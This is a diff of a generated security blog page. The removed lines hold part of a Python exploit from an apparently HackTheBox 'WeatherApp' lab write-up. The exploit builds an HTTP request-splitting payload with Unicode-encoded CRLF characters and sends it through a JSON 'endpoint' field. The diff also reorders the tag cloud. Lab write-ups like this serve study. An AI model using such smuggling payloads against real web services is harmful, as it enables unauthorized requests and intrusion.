-    <span class="token string">"Content-Length:"</span> <span class="token operator">+</span> <span class="token string">"\u0120"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">19</span><span class="token punctuation">)</span> <span class="token operator">+</span> \
-    <span class="token string">"\u010D\u010A"</span> <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span> <span class="token operator">+</span> <span class="token string">"username="</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"&amp;password="</span> <span class="token operator">+</span> password\
-    <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span> <span class="token operator">+</span> <span class="token string">"\u010D\u010A"</span> <span class="token operator">+</span> <span class="token string">"GET"</span> <span class="token operator">+</span> <span class="token string">"\u0120"</span>
-
-res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'endpoint'</span><span class="token punctuation">:</span> endpoint<span class="token punctuation">,</span> <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token string">'Tokyo'</span><span class="token punctuation">,</span> <span class="token string">'country'</span><span class="token punctuation">:</span> <span class="token string">'JP'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
+		<p> 好久才想起来</p>
 	
 	</div>
   <a type="button" href="/2023/11/20/htb-WeatherApp/#more" class="btn btn-default more">Read More</a>
@@ -684,29 +474,31 @@ res <span class="token operator">=</span> requests<span class="token punctuation
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/http走私/">http走私<span>1</span></a></li>
-		
-			<li><a href="/tags/XSS/">XSS<span>1</span></a></li>
-		
-			<li><a href="/tags/wordpress/">wordpress<span>1</span></a></li>
-		
-			<li><a href="/tags/JavaSec/">JavaSec<span>1</span></a></li>
-		
-			<li><a href="/tags/info-recon/">info_recon<span>1</span></a></li>
-		
-			<li><a href="/tags/hackthebox/">hackthebox<span>2</span></a></li>
+			<li><a href="/tags/概念/">概念<span>1</span></a></li>
 		
 			<li><a href="/tags/Linux/">Linux<span>3</span></a></li>
 		
-			<li><a href="/tags/Web/">Web<span>3</span></a></li>
+			<li><a href="/tags/http走私/">http走私<span>1</span></a></li>
 		
 			<li><a href="/tags/injection/">injection<span>1</span></a></li>
 		
-			<li><a href="/tags/概念/">概念<span>1</span></a></li>
+			<li><a href="/tags/info-recon/">info_recon<span>1</span></a></li>
+		
+			<li><a href="/tags/wordpress/">wordpress<span>1</span></a></li>
+		
+			<li><a href="/tags/Node-js/">Node.js<span>1</span></a></li>
+		
+			<li><a href="/tags/JavaSec/">JavaSec<span>1</span></a></li>
+		
+			<li><a href="/tags/web/">web<span>2</span></a></li>
+		
+			<li><a href="/tags/XSS/">XSS<span>1</span></a></li>
+		
+			<li><a href="/tags/Web/">Web<span>3</span></a></li>
 		
 			<li><a href="/tags/Python/">Python<span>2</span></a></li>
 		
-			<li><a href="/tags/web/">web<span>2</span></a></li>
+			<li><a href="/tags/hackthebox/">hackthebox<span>2</span></a></li>
 		
 		 
 		</ul>
